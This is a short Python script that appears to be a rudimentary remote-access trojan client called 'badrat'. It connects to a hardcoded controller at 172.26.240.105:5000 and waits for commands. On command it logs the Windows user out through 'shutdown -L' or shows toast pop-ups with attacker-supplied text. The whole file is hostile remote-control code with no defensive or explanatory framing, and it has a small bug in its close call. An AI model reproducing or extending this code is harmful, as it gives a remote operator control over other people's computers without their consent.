from win10toast import ToastNotifier
import socket
import subprocess

s = socket.socket()
host = "172.26.240.105"
port = 5000

s.connect((host, port))

while True:
    cmd = s.recv(1024).decode("utf-8")

    if cmd == "logout":
        subprocess.call(["shutdown", "-L"])

    if cmd == "exit":
        s.close
        break

    cmd = cmd.split(" ")

    if cmd[0] == "message" and len(cmd) == 2:
        toaster = ToastNotifier()
        toaster.show_toast("badrat", cmd[1], duration = 10)
        
